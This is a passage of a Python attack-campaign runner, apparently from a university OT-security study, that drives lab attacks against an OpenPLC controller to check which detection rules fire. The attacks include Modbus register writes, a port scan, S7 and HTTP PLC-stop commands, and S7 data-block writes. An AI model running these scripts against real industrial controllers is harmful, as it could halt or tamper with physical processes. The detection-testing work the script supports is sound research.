#!/usr/bin/env python3
"""
attack_runner.py -- validacios kampany-vegrehajto (M4a, prereg-v1).

Fut a Red-Team-VM-en. A V1 (replikacios) es a V2 (kiterési/kiegeszito)
kampany kozos vegrehajtoja. A protokoll: docs/tdk/VALIDACIOS-PROTOKOLL.md
(prereg-v1), a dontesek: docs/tdk/DONTESEK.md (D0-D13).

Kampanyok (--campaign):
  V1 (D3): A1 20, A2 20, A3 3, A4 20, A6 3 (osszekevert fo menetrend) +
           A5 3 (kulon blokk). Forras: .50.
  V2 (D4): V2.1 20 (.51), V2.2 20, V2.3 20, V2.4 20, V2.5 20 (.50).

Seed (D3): a --seed kotelezo; random.seed(seed) minden veletlen dontes
elott. A seed minden JSONL-rekordba es (a run_campaign.sh-n keresztul) a
manifestbe kerul. A --dry-run halozat nelkul, determinisztikusan irja ki
az epizodtervet.

A T0816 (A.4 S7 plc_stop, A.5 HTTP /stop_plc) hatasat a D2/4.3 szerint a
PLC VM-en, a menedzsmenthalozaton at (SSH) a 102-es porton figyelo folyamat
/proc/<pid>/stat utime+stime (#111) deltajaval igazoljuk; a get_cpu_state()
nem hasznalhato (E-22). A cel-hoszt/felhasznalo/kulcs kornyezeti valtozobol
konfigurahato (OT_PLC_MGMT_SSH, OT_PLC_MGMT_SSH_KEY).

A visszaallitas (D2) a menedzsmenthalozati web-API /start_plc hivasa, a
merési ablakon kivul -- de CSAK akkor (E-30), ha a stop tenylegesen leallitotta
a runtime-ot (effect_branch="listener_gone"); egyebkent nem hivjuk, mert futo
core-on a /start_plc atmeneti Modbus-kiesest okozna. Minden visszaallitas utan
keszenleti kapu (FC03 a mgmt-IP 502-ere + 102-figyelo). A hitelesito adat
kizarolag az OPENPLC_USER / OPENPLC_PASS kornyezeti valtozobol jon (mint a
lab_up.sh-ban); sosem kerul a kodba vagy a logba.
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import random
import re
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Callable, Optional

# A requests / snap7 / pymodbus importja szandekosan kesleltetett (a hivo
# fuggvenyekben), hogy a --dry-run halozati fuggosegek nelkul is fusson.

AUTO_ADVANCE_S = 10.0
_abort_requested = threading.Event()


def _handle_operator_abort(signum, _frame) -> None:
    logging.warning(
        "Operatori megszakitas jelezve (signal %s) -- a kovetkezo epizod "
        "elott a kampany leall.", signum,
    )
    _abort_requested.set()


def auto_advance_wait(seconds: float, prompt: str) -> None:
    print(f"{prompt}  [{seconds:.0f}s auto-advance; Ctrl+C vagy SIGUSR1 a megszakitashoz]")
    if _abort_requested.wait(timeout=seconds):
        raise CampaignAbortError("Operatori megszakitas (SIGUSR1/SIGINT) -- kampany leallitva.")


# --------------------------------------------------------------------------
# KONFIGURACIO
# --------------------------------------------------------------------------

SOURCE_IP_ATTACKER = "192.168.1.50"     # nem allowlistelt tamadoi identitas
SOURCE_IP_ALLOWLIST = "192.168.1.51"    # allowlistelt "engineering station" alias
TARGET_IP = "192.168.1.100"
MODBUS_PORT = 502
S7_RACK, S7_SLOT = 0, 1
DEVICE_ID = 1
REGISTER_ADDRESS = 0
BASELINE_VALUE = 1009                   # D9 kezdoallapot (.51-rol irva, ablakon kivul)

# A.5 tamadas: OT-Net; a visszaallitas: menedzsmenthalozat (D2/4.3, 4e)
OPENPLC_WEB_OT = "http://192.168.1.100:8080"
OPENPLC_WEB_MGMT = f"http://{os.environ.get('OT_PLC_MGMT_HOST', '192.168.56.20')}:8080"

# Hatasigazolasi SSH-csatorna a PLC menedzsment-IP-jere (konfigurahato; a
# precond.-ellenorzes szerint ez meg nincs kiepitve -- lasd M4a-jegyzet).
PLC_MGMT_SSH = os.environ.get("OT_PLC_MGMT_SSH", "ot@192.168.56.20")
PLC_MGMT_SSH_KEY = os.environ.get("OT_PLC_MGMT_SSH_KEY", "")

LOG_PATH = Path(os.environ.get("ATTACK_LOG_PATH", "attack_log.jsonl"))
SCHEDULE_PATH = Path(os.environ.get("ATTACK_SCHEDULE_PATH", "attack_schedule.jsonl"))
# Az ablakon kivuli, nem merendo kontroll-muveletek (D9 init, D2 restore):
CONTROL_PATH = Path(os.environ.get("ATTACK_CONTROL_PATH", "attack_control.jsonl"))
CONNECT_TIMEOUT_S = 3

# D.1 / 3.1-3.2 tablazat N-jei
N_A1, N_A2, N_A3, N_A4, N_A5, N_A6 = 20, 20, 3, 20, 3, 3
N_V2 = 20

PAUSE_DEFAULT_BASE_S = 30
PAUSE_DEFAULT_JITTER_S = 10
PAUSE_QUALITATIVE_S = 60             # A.3 / A.5 / A.6

# D2/4.3-4.5 hatasigazolas (prereg-v1.1, a kalibracio alapjan -- E-24).
# A kalibracio (results/m4b/effect_calibration_20261031T091355Z.jsonl) szerint a
# mgmt /stop_plc hatasara az OpenPLC-runtime folyamata KILEP (a 102 lezar), ezert
# az elsodleges jel a 102-figyelo jelenlete; a tick-delta masodlagos (ha a folyamat
# a stop utan is figyel). Ablakhossz konfigurahato (20 s).
EFFECT_WINDOW_S = float(os.environ.get("OT_EFFECT_WINDOW_S", "20"))
EFFECT_POST_WAIT_S = 2.0            # varakozas a stop utan a mérés/ellenorzes elott
EFFECT_LISTENER_CHECKS = 3         # a stop utani 102-figyelo-ellenorzesek szama
EFFECT_LISTENER_CHECK_GAP_S = 2.0  # az ellenorzesek kozti ido
EFFECT_LIVE_STOP_MAX_TICKS = 2     # scan_stopped ag: elo-de-leallitott kuszob (T=2, floor((R_min=5 + S_max=0)/2))
RESET_GUARD_S = 6.0                 # E-27: minden visszaallitas legkorabban end_ts + 6 s (az end_ts + 5 s ablakon kivul)
SSH_CMD_TIMEOUT_S = 20

# E-30: keszenleti kapu MINDEN visszaallitas utan -- FC03 a PLC menedzsment-IP
# 502-es portjara (NEM OT-Net, igy a mert forgalmat nem szennyezi) + 102-figyelo.
PLC_READY_TIMEOUT_S = float(os.environ.get("OT_PLC_READY_TIMEOUT_S", "60"))
PLC_READY_INTERVAL_S = 2.0
# E-30: ennyi EGYMAST KOVETO error-epizod utan all le a kampany (addig megy tovabb).
MAX_CONSECUTIVE_ERRORS = 3
_consecutive_errors = 0             # modul-szintu allapot; a kampany elejen 0-zodik

# V2.5 belso varakozas a FC03 es az iras kozott (D4/NYK-6)
V25_GAP_S = 15
# V2.3 (T0821) irt ertek (D4/NYK-6), 2 bajt big-endian
V23_DB_VALUE = 4242
V2_DB_NUMBER = 1002
V2_DB_START = 0
V2_DB_SIZE = 2


class CampaignAbortError(RuntimeError):
    """A kampanyt biztonsagi okbol le kell allitani."""


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def append_jsonl(path: Path, record: dict) -> None:
    with path.open("a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")


# --------------------------------------------------------------------------
# Epizod-leiras es menetrend
# --------------------------------------------------------------------------

@dataclass
class Episode:
    episode_id: str
    scenario_id: str
    mitre_technique_id: str
    source_ip: str
    pause_after_s: float
    notes: str = ""


def _jitter_pause() -> float:
    return PAUSE_DEFAULT_BASE_S + random.uniform(-PAUSE_DEFAULT_JITTER_S, PAUSE_DEFAULT_JITTER_S)


def build_schedule_v1() -> list[Episode]:
    """V1 fo menetrend (A1,A2,A3,A4,A6), osszekeverve. Az A.5 kulon blokk."""
    episodes: list[Episode] = []
    for i in range(1, N_A1 + 1):
        episodes.append(Episode(f"A1_T0836_{i:03d}", "A1", "T0836", SOURCE_IP_ATTACKER,
                                 _jitter_pause(), "Nem allowlistelt forras (D5)."))
    for i in range(1, N_A2 + 1):
        episodes.append(Episode(f"A2_T0888_{i:03d}", "A2", "T0888", SOURCE_IP_ATTACKER,
                                 _jitter_pause()))
    for i in range(1, N_A3 + 1):
        episodes.append(Episode(f"A3_T0846.001_{i:03d}", "A3", "T0846.001", SOURCE_IP_ATTACKER,
                                 PAUSE_QUALITATIVE_S, "Kvalitativ (D3, N=3)."))
    for i in range(1, N_A4 + 1):
        episodes.append(Episode(f"A4_T0816_{i:03d}", "A4", "T0816", SOURCE_IP_ATTACKER,
                                 _jitter_pause(), "S7 plc_stop + hatasigazolas (D2)."))
    for i in range(1, N_A6 + 1):
        episodes.append(Episode(f"A6_T0843_{i:03d}", "A6", "T0843", SOURCE_IP_ATTACKER,
                                 PAUSE_QUALITATIVE_S, "Garantalt vakfolt (D3, N=3)."))
    random.shuffle(episodes)
    return episodes


def build_schedule_v2() -> list[Episode]:
    """V2 (D4/3.2), N=20 szcenariokent, osszekeverve."""
    episodes: list[Episode] = []
    spec = [
        ("V21", "T0836", SOURCE_IP_ALLOWLIST, "Kompromittalt mernoki allomas (.51), FC03+FC06."),
        ("V22", "T0893", SOURCE_IP_ATTACKER, "snap7 db_read(1002,0,2)."),
        ("V23", "T0821", SOURCE_IP_ATTACKER, f"snap7 db_write(1002,0,{V23_DB_VALUE} big-endian 2B)."),
        ("V24", "T0836", SOURCE_IP_ATTACKER, "Kiteres: FC16 FC06 helyett."),
        ("V25", "T0836", SOURCE_IP_ATTACKER, f"Kiteres: {V25_GAP_S}s a FC03 es az iras kozott."),
    ]
    for sid, tech, src, note in spec:
        for i in range(1, N_V2 + 1):
            episodes.append(Episode(f"{sid}_{tech}_{i:03d}", sid, tech, src,
                                    _jitter_pause(), note))
    random.shuffle(episodes)
    return episodes


def log_schedule(episodes: list[Episode], seed: int, campaign: str) -> None:
    for ep in episodes:
        append_jsonl(SCHEDULE_PATH, {
            "logged_at": utc_now_iso(), "campaign": campaign, "seed": seed,
            "episode_id": ep.episode_id, "scenario_id": ep.scenario_id,
            "mitre_technique_id": ep.mitre_technique_id, "source_ip": ep.source_ip,
            "planned_pause_after_s": round(ep.pause_after_s, 1),
        })


# --------------------------------------------------------------------------
# Modbus / S7 segedfuggvenyek
# --------------------------------------------------------------------------

def modbus_client(source_ip: str):
    from pymodbus.client import ModbusTcpClient
    # #94: a source_address a kapcsolodaskor atadja a forras-IP-t.
    return ModbusTcpClient(TARGET_IP, port=MODBUS_PORT, timeout=CONNECT_TIMEOUT_S,
                           source_address=(source_ip, 0))


def s7_client():
    import snap7
    c = snap7.client.Client()
    c.connect(TARGET_IP, S7_RACK, S7_SLOT)
    return c


def _attacker_value() -> int:
    """A.1/V2.1/V2.4/V2.5 irt erteke: a D9 baseline-tol elterő, determinisztikus."""
    return BASELINE_VALUE + random.randint(1, 20)


# --------------------------------------------------------------------------
# D2/4.3 hatasigazolas -- /proc a PLC VM-en, menedzsmenthalozaton at (SSH)
# --------------------------------------------------------------------------

def _plc_mgmt_ssh(remote_cmd: str) -> tuple[int, str, str]:
    """Egyetlen parancs a PLC menedzsment-IP-jen, SSH-n. A cel/kulcs
    konfigurahato (OT_PLC_MGMT_SSH / OT_PLC_MGMT_SSH_KEY). Csak olvas."""
    argv = ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10"]
    if PLC_MGMT_SSH_KEY:
        argv += ["-i", PLC_MGMT_SSH_KEY]
    argv += [PLC_MGMT_SSH, remote_cmd]
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=SSH_CMD_TIMEOUT_S)
        return p.returncode, p.stdout, p.stderr
    except Exception as exc:  # timeout, ssh hiany stb.
        return 255, "", str(exc)


def _plc_listener_pid() -> Optional[int]:
    """A 102-es TCP-porton figyelo folyamat pid-je (sudo -n ss -tlnp)."""
    rc, out, _ = _plc_mgmt_ssh("sudo -n ss -tlnp")
    if rc != 0:
        return None
    for line in out.splitlines():
        cols = line.split()
        if any(c.endswith(":102") for c in cols):
            m = re.search(r"pid=(\d+)", line)
            if m:
                return int(m.group(1))
    return None


def _mgmt_modbus_fc03_ok() -> bool:
    """Egy FC03 (read holding register, addr=0, qty=1) a PLC menedzsment-IP
    502-es portjara, NYERS Modbus/TCP socketen. A cel a mgmt-IP (nem OT-Net),
    ezert a Sensor (enp0s8) nem latja, a mert forgalmat nem szennyezi. Csak azt
    jelzi, valaszol-e a Modbus-szerver (FC03-valasz, func 0x03)."""
    import socket
    host = os.environ.get("OT_PLC_MGMT_HOST", "192.168.56.20")
    req = bytes.fromhex("000100000006010300000001")  # MBAP tid=1 + FC03 addr=0 qty=1, uid=1
    try:
        with socket.create_connection((host, MODBUS_PORT), timeout=CONNECT_TIMEOUT_S) as s:
            s.sendall(req)
            r = s.recv(256)
        return len(r) >= 9 and r[7] == 0x03
    except OSError:
        return False


def _plc_ready_gate(timeout_s: float = PLC_READY_TIMEOUT_S,
                    interval_s: float = PLC_READY_INTERVAL_S) -> dict:
    """E-30: keszenleti kapu a visszaallitas utan. A PLC akkor "all", ha a
    menedzsment-IP 502-es portjan FC03 valaszol ES a 102-es porton figyel
    folyamat; legfeljebb timeout_s-ig, interval_s-onkent. Visszaad:
    {ready, waited_s, fc03_ok, listener, attempts}."""
    start = time.monotonic()
    deadline = start + timeout_s
    attempts = 0
    fc03_ok = listener = False
    while True:
        attempts += 1
        fc03_ok = _mgmt_modbus_fc03_ok()
        listener = _plc_listener_pid() is not None
        if fc03_ok and listener:
            break
        if time.monotonic() >= deadline:
            break
        time.sleep(interval_s)
    return {"ready": bool(fc03_ok and listener),
            "waited_s": round(time.monotonic() - start, 1),
            "fc03_ok": fc03_ok, "listener": listener, "attempts": attempts}


def _parse_stat(line: str) -> Optional[tuple[int, str, int]]:
    """Egy /proc/*/stat sorbol: (id, comm, utime+stime). A comm zarojelet/
    szokozt tartalmazhat, ezert az elso '(' es az utolso ')' kozott olvassuk;
    a 14. (utime) es a 15. (stime) mezo a ')' utani 12. es 13. token (#111)."""
    line = line.strip()
    lp, rp = line.find("("), line.rfind(")")
    if lp < 0 or rp < 0 or rp < lp:
        return None
    head = line[:lp].split()
    if not head:
        return None
    try:
        ident = int(head[0])
        after = line[rp + 1:].split()
        return ident, line[lp + 1:rp], int(after[11]) + int(after[12])
    except (IndexError, ValueError):
        return None


def _proc_snapshot(pid: int) -> tuple[Optional[int], dict[int, tuple[str, int]]]:
    """A fo folyamat (utime+stime) es szalankent (/proc/<pid>/task/*/stat) a
    CPU-ido, egyetlen SSH-hivasban. Visszaad: (fo_osszeg|None, {tid:(comm,osszeg)})."""
    remote = (f"cat /proc/{pid}/stat 2>/dev/null; echo '@@TASKS@@'; "
              f"cat /proc/{pid}/task/*/stat 2>/dev/null")
    rc, out, _ = _plc_mgmt_ssh(remote)
    if rc != 0 or "@@TASKS@@" not in out:
        return None, {}
    main_part, _, tasks_part = out.partition("@@TASKS@@")
    main = None
    p = _parse_stat(main_part) if main_part.strip() else None
    if p:
        main = p[2]
    threads: dict[int, tuple[str, int]] = {}
    for line in tasks_part.splitlines():
        if not line.strip():
            continue
        q = _parse_stat(line)
        if q:
            threads[q[0]] = (q[1], q[2])
    return main, threads


def _measure_cpu_window(pid: Optional[int] = None) -> dict:
    """A 102-n figyelo (vagy a megadott) folyamat utime+stime deltaja
    EFFECT_WINDOW_S alatt, szalankent is. Nyers adat a rekordba/kalibraciohoz."""
    if pid is None:
        pid = _plc_listener_pid()
    if pid is None:
        return {"pid": None, "total_delta": None, "listener": False, "threads": {}}
    m0, th0 = _proc_snapshot(pid)
    if m0 is None:
        return {"pid": pid, "total_delta": None, "listener": False, "threads": {}}
    time.sleep(EFFECT_WINDOW_S)
    m1, th1 = _proc_snapshot(pid)
    if m1 is None:
        return {"pid": pid, "total_delta": None, "listener": False, "threads": {}}
    threads = {}
    for tid, (comm, t1) in th1.items():
        if tid in th0:
            threads[str(tid)] = {"comm": comm, "delta": t1 - th0[tid][1]}
    return {"pid": pid, "total_delta": m1 - m0, "listener": True, "threads": threads}


def run_stop_with_effect(stop_callable: Callable[[], dict]) -> dict:
    """D2 hatasigazolas, ketagu jel (prereg-v1.1, a kalibracio alapjan -- E-24):

    1. Ha a stop elott figyel folyamat a 102-n (pid0), es a stop utan (2 s
       varakozas, majd EFFECT_LISTENER_CHECKS x 2 s ellenorzes) a 102-n NINCS
       figyelo -> executed_effect (effect_branch="listener_gone").
    2. Ha a stop utan van figyelo: a figyelo folyamat tick-deltaja az utana-
       ablakban (20 s). <= EFFECT_LIVE_STOP_MAX_TICKS (2) -> executed_effect
       (effect_branch="scan_stopped"); > 2 -> executed_no_effect
       (effect_branch="scan_running").
    3. Ha a stop elott nincs figyelo, vagy a mérés hibazik -> executed_no_measurement.

    A tick-adat (osszesitett + szalankent) minden agban nyers diagnosztikakent
    a rekordban marad."""
    before = _measure_cpu_window()
    pid0 = before["pid"]
    stop_result = stop_callable()

    # a stop utan: 2 s varakozas, majd EFFECT_LISTENER_CHECKS ellenorzes 2 s-onkent
    time.sleep(EFFECT_POST_WAIT_S)
    listener_checks: list[Optional[int]] = []
    for i in range(EFFECT_LISTENER_CHECKS):
        if i > 0:
            time.sleep(EFFECT_LISTENER_CHECK_GAP_S)
        listener_checks.append(_plc_listener_pid())
    listener_after_present = any(p is not None for p in listener_checks)

    after: Optional[dict] = None
    after_delta: Optional[int] = None
    if pid0 is None or not before["listener"]:
        effect_status, effect_branch = "executed_no_measurement", "no_measurement"
    elif not listener_after_present:
        effect_status, effect_branch = "executed_effect", "listener_gone"
    else:
        post_pid = next(p for p in listener_checks if p is not None)
        after = _measure_cpu_window(post_pid)
        after_delta = after["total_delta"]
        if after_delta is None:
            effect_status, effect_branch = "executed_no_measurement", "no_measurement"
        elif after_delta <= EFFECT_LIVE_STOP_MAX_TICKS:
            effect_status, effect_branch = "executed_effect", "scan_stopped"
        else:
            effect_status, effect_branch = "executed_no_effect", "scan_running"

    params = dict(stop_result)
    params.update({
        "pid_before": pid0,
        "listener_checks_after": listener_checks,
        "listener_after": listener_after_present,
        "pid_after": after["pid"] if after else (next((p for p in listener_checks if p is not None), None)),
        "ticks_before_delta": before["total_delta"],
        "ticks_after_delta": after_delta,
        "effect_status": effect_status,
        "effect_branch": effect_branch,
        "effect_window_s": EFFECT_WINDOW_S,
        "threads_before": before["threads"],
        "threads_after": after["threads"] if after else {},
    })
    return {"status": effect_status, "parameters": params}


def _mgmt_plc_action(action: str) -> dict:
    """/login + GET /<action> a menedzsmenthalozati web-API-n (stop_plc/start_plc).
    Csak a statuszkodokat adja vissza; a hitelesito adat nem kerul logba."""
    import requests
    user, pw = _openplc_creds()
    s = requests.Session()
    try:
        s.get(f"{OPENPLC_WEB_MGMT}/login", timeout=5)
        r = s.post(f"{OPENPLC_WEB_MGMT}/login", data={"username": user, "password": pw},
                   timeout=5, allow_redirects=False)
        login_status = r.status_code
        r2 = s.get(f"{OPENPLC_WEB_MGMT}/{action}", timeout=15, allow_redirects=False)
        act_status = r2.status_code
    finally:
        del user, pw
        s.close()
    return {"action": action, "login_status": login_status, "status": act_status}


def calibrate_effect(n: int) -> None:
    """Pozitiv kontroll (3. pont): N db ablak futo allapotban, (mgmt) stop,
    2 s varakozas, N db ablak leallitott allapotban, (mgmt) start. Minden ablak
    nyers adata JSONL-be: results/m4b/effect_calibration_<UTC>.jsonl."""
    import datetime as _dt
    outdir = Path("results/m4b")
    outdir.mkdir(parents=True, exist_ok=True)
    stamp = _dt.datetime.now(_dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    path = outdir / f"effect_calibration_{stamp}.jsonl"
    cal_start = utc_now_iso()
    pid0 = _plc_listener_pid()
    print(f"kalibracio start={cal_start} pid0(102)={pid0} window={EFFECT_WINDOW_S}s N={n}")

    def emit(rec: dict) -> None:
        append_jsonl(path, {"cal_start": cal_start, "window_s": EFFECT_WINDOW_S, **rec, "ts": utc_now_iso()})

    for i in range(1, n + 1):
        w = _measure_cpu_window(pid0)
        emit({"state": "running", "index": i, **w})
        print(f"  running {i}/{n}: pid={w['pid']} delta={w['total_delta']}")
    stop = _mgmt_plc_action("stop_plc")
    emit({"kind": "mgmt_stop", **stop})
    print(f"  mgmt stop_plc: {stop}")
    time.sleep(EFFECT_POST_WAIT_S)
    for i in range(1, n + 1):
        cur = _plc_listener_pid()
        w = _measure_cpu_window(pid0)
        emit({"state": "stopped", "index": i, "current_listener_pid": cur, **w})
        print(f"  stopped {i}/{n}: pid0={w['pid']} delta={w['total_delta']} current_listener={cur}")
    start = _mgmt_plc_action("start_plc")
    emit({"kind": "mgmt_start", **start})
    print(f"  mgmt start_plc: {start}")
    cal_end = utc_now_iso()
    emit({"kind": "cal_window", "cal_end": cal_end})
    print(f"kalibracio vege={cal_end}; fajl: {path}")


# --------------------------------------------------------------------------
# V1 szcenariok
# --------------------------------------------------------------------------

def run_a1(ep: Episode) -> dict:
    """T0836: FC03 olvasas -> FC06 iras eltero ertekkel, .50-rol."""
    client = modbus_client(ep.source_ip)
    client.connect()
    rr = client.read_holding_registers(address=REGISTER_ADDRESS, count=1, device_id=DEVICE_ID)
    value_before = rr.registers[0] if not rr.isError() else None
    new_value = _attacker_value()
    wr = client.write_register(address=REGISTER_ADDRESS, value=new_value, device_id=DEVICE_ID)
    client.close()
    return {
        "status": "error" if (rr.isError() or wr.isError()) else "executed",
        "parameters": {"fc": "FC03+FC06", "address": REGISTER_ADDRESS,
                       "value_before": value_before, "value_after": new_value},
    }


def run_a2(ep: Episode) -> dict:
    """T0888: tobbfunkciós olvasasi sorozat egy kapcsolaton belul."""
    client = modbus_client(ep.source_ip)
    client.connect()
    results = {}
    for fn_name, fn in (
        ("read_holding_registers", client.read_holding_registers),
        ("read_coils", client.read_coils),
        ("read_discrete_inputs", client.read_discrete_inputs),
        ("read_input_registers", client.read_input_registers),
    ):
        try:
            r = fn(address=0, count=8, device_id=DEVICE_ID)
            results[fn_name] = "error" if r.isError() else "ok"
        except Exception as exc:
            results[fn_name] = f"exception: {exc}"
    client.close()
    return {"status": "executed", "parameters": {"reads": results}}


def run_a3(ep: Episode) -> dict:
    """T0846.001 Port Scan: TCP connect-sweep az OT-Net-en, 502/102."""
    import socket
    open_hosts = []
    for last_octet in range(1, 255):
        host = f"192.168.1.{last_octet}"
        for port in (502, 102):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            try:
                if s.connect_ex((host, port)) == 0:
                    open_hosts.append(f"{host}:{port}")
            finally:
                s.close()
    return {"status": "executed", "parameters": {"open_hosts": open_hosts}}


def _a4_s7_stop() -> dict:
    """A.4 stop-parancs: S7 plc_stop() (get_cpu_state NELKUL, E-22)."""
    client = s7_client()
    try:
        result = client.plc_stop()
    finally:
        client.disconnect()
    return {"vector": "s7_plc_stop", "plc_stop_result": str(result)}


def run_a4(ep: Episode) -> dict:
    """T0816 (S7): plc_stop + /proc-alapu hatasigazolas (D2)."""
    return run_stop_with_effect(_a4_s7_stop)


def run_a6(ep: Episode) -> dict:
    """T0843: elutasitott block-download kiserlet -- garantalt vakfolt."""
    client = s7_client()
    status = "blocked"
    detail = None
    try:
        client.download(data=b"\x00" * 16, block_num=1)
        status = "executed"
    except Exception as exc:
        detail = str(exc)
    finally:
        client.disconnect()
    return {"status": status, "parameters": {"detail": detail}}


# --------------------------------------------------------------------------
# A.5 -- HTTP vektor (OT-Net): /login + /stop_plc + hatasigazolas (D2)
# --------------------------------------------------------------------------

def _openplc_creds() -> tuple[str, str]:
    u = os.environ.get("OPENPLC_USER")
    p = os.environ.get("OPENPLC_PASS")
    if not u or not p:
        raise RuntimeError(
            "OPENPLC_USER/OPENPLC_PASS kornyezeti valtozo nincs beallitva "
            "(a hitelesito adat sosem kerul a kodba/logba)."
        )
    return u, p


def _a5_http_stop() -> dict:
    """A.5 stop-parancs: POST /login (#90:601-640), majd GET /stop_plc
    (#90:642-668) az OT-Neten. Csak a statuszkodokat naplozzuk."""
    import requests
    user, pw = _openplc_creds()
    s = requests.Session()
    try:
        s.get(f"{OPENPLC_WEB_OT}/login", timeout=5)
        r = s.post(f"{OPENPLC_WEB_OT}/login",
                   data={"username": user, "password": pw},
                   timeout=5, allow_redirects=False)
        login_status = r.status_code
        r2 = s.get(f"{OPENPLC_WEB_OT}/stop_plc", timeout=10, allow_redirects=False)
        stop_status = r2.status_code
    finally:
        del user, pw
        s.close()
    return {"vector": "http_stop_plc", "login_status": login_status, "stop_status": stop_status}


def run_a5(ep: Episode) -> dict:
    """T0816 (HTTP): /login + /stop_plc + /proc-alapu hatasigazolas (D2)."""
    return run_stop_with_effect(_a5_http_stop)


# --------------------------------------------------------------------------
# V2 szcenariok (D4 / 3.2)
# --------------------------------------------------------------------------

def run_v21(ep: Episode) -> dict:
    """T0836, kompromittalt mernoki allomas: FC03+FC06 a .51-rol."""
    client = modbus_client(ep.source_ip)  # .51
    client.connect()
    rr = client.read_holding_registers(address=REGISTER_ADDRESS, count=1, device_id=DEVICE_ID)
    value_before = rr.registers[0] if not rr.isError() else None
    new_value = _attacker_value()
    wr = client.write_register(address=REGISTER_ADDRESS, value=new_value, device_id=DEVICE_ID)
    client.close()
    return {"status": "error" if (rr.isError() or wr.isError()) else "executed",
            "parameters": {"fc": "FC03+FC06", "value_before": value_before, "value_after": new_value}}


def run_v22(ep: Episode) -> dict:
    """T0893: snap7 db_read(1002, 0, 2) a .50-rol."""
    client = s7_client()
    try:
        data = client.db_read(V2_DB_NUMBER, V2_DB_START, V2_DB_SIZE)
        detail = data.hex()
        status = "executed"
    except Exception as exc:
        detail = str(exc)
        status = "error"
    finally:
        client.disconnect()
    return {"status": status, "parameters": {"op": "db_read", "db": V2_DB_NUMBER,
                                             "start": V2_DB_START, "size": V2_DB_SIZE, "detail": detail}}


def run_v23(ep: Episode) -> dict:
    """T0821: snap7 db_write(1002, 0, 4242 big-endian 2B) a .50-rol."""
    client = s7_client()
    payload = V23_DB_VALUE.to_bytes(V2_DB_SIZE, "big")
    try:
        client.db_write(V2_DB_NUMBER, V2_DB_START, payload)
        status = "executed"
        detail = payload.hex()
    except Exception as exc:
        status = "error"
        detail = str(exc)
    finally:
        client.disconnect()
    return {"status": status, "parameters": {"op": "db_write", "db": V2_DB_NUMBER,
                                             "start": V2_DB_START, "value": V23_DB_VALUE, "detail": detail}}


def run_v24(ep: Episode) -> dict:
    """T0836 kiteres: FC03 + FC16 (write_multiple_registers) a .50-rol (#79)."""
    client = modbus_client(ep.source_ip)
    client.connect()
    rr = client.read_holding_registers(address=REGISTER_ADDRESS, count=1, device_id=DEVICE_ID)
    value_before = rr.registers[0] if not rr.isError() else None
    new_value = _attacker_value()
    wr = client.write_registers(address=REGISTER_ADDRESS, values=[new_value], device_id=DEVICE_ID)
    client.close()
    return {"status": "error" if (rr.isError() or wr.isError()) else "executed",
            "parameters": {"fc": "FC03+FC16", "value_before": value_before, "value_after": new_value}}


def run_v25(ep: Episode) -> dict:
    """T0836 kiteres: FC03, 15s varakozas, FC06 a .50-rol (> 10s maxspan, #87)."""
    client = modbus_client(ep.source_ip)
    client.connect()
    rr = client.read_holding_registers(address=REGISTER_ADDRESS, count=1, device_id=DEVICE_ID)
    value_before = rr.registers[0] if not rr.isError() else None
    time.sleep(V25_GAP_S)
    new_value = _attacker_value()
    wr = client.write_register(address=REGISTER_ADDRESS, value=new_value, device_id=DEVICE_ID)
    client.close()
    return {"status": "error" if (rr.isError() or wr.isError()) else "executed",
            "parameters": {"fc": "FC03+FC06", "gap_s": V25_GAP_S,
                           "value_before": value_before, "value_after": new_value}}


SCENARIO_RUNNERS: dict[str, Callable[[Episode], dict]] = {
    "A1": run_a1, "A2": run_a2, "A3": run_a3, "A4": run_a4, "A6": run_a6, "A5": run_a5,
    "V21": run_v21, "V22": run_v22, "V23": run_v23, "V24": run_v24, "V25": run_v25,
}

EXPECTED_RULES: dict[str, list[str]] = {
    "A1": ["eql_naive_readwrite", "eql_refined_readwrite"],
    "A2": [],
    "A3": ["conn_log_portscan", "sid_2009286"],
    "A4": ["dsl_s7comm_plc_stop"],
    "A5": ["http_log_stop_plc"],
    "A6": [],
    "V21": ["eql_refined_readwrite"],
    "V22": ["s7comm_read_variable"],
    "V23": ["s7comm_write_variable"],
    "V24": ["eql_refined_readwrite"],
    "V25": ["eql_refined_readwrite"],
}

_S7_SCENARIOS = {"A4", "A6", "V22", "V23"}
_HTTP_SCENARIOS = {"A5"}


def _protocol_of(sid: str) -> str:
    if sid in _HTTP_SCENARIOS:
        return "http"
    if sid in _S7_SCENARIOS:
        return "s7comm"
    if sid == "A3":
        return "tcp"
    return "modbus"


def _tool_of(sid: str) -> str:
    if sid in _HTTP_SCENARIOS:
        return "requests"
    if sid in _S7_SCENARIOS:
        return "python-snap7"
    if sid == "A3":
        return "socket"
    return "pymodbus"


# --------------------------------------------------------------------------
# Ablakon kivuli kontroll-muveletek: D9 init, D2 restore
# --------------------------------------------------------------------------

def init_baseline_state(seed: int, campaign: str) -> dict:
    """D9: a 0. holding register = 1009, a .51-rol, a merési ablakon kivul."""
    client = modbus_client(SOURCE_IP_ALLOWLIST)
    client.connect()
    wr = client.write_register(address=REGISTER_ADDRESS, value=BASELINE_VALUE, device_id=DEVICE_ID)
    client.close()
    rec = {"kind": "init_baseline", "campaign": campaign, "seed": seed,
           "register": REGISTER_ADDRESS, "value": BASELINE_VALUE,
           "source_ip": SOURCE_IP_ALLOWLIST, "performed": not wr.isError(), "ts": utc_now_iso()}
    append_jsonl(CONTROL_PATH, rec)
    return rec


def restore_plc_running(seed: int, campaign: str, episode_id: str) -> dict:
    """D2: /login + /start_plc a menedzsmenthalozaton, a merési ablakon kivul.
    A 'performed' a HTTP-sikeren alapul (nem login-ra iranyitas); a 102-figyelo
    legjobb-igyekezetu megerosites (az SSH-csatornatol fuggoen)."""
    import requests
    user, pw = _openplc_creds()
    s = requests.Session()
    try:
        s.get(f"{OPENPLC_WEB_MGMT}/login", timeout=5)
        r = s.post(f"{OPENPLC_WEB_MGMT}/login",
                   data={"username": user, "password": pw},
                   timeout=5, allow_redirects=False)
        login_status = r.status_code
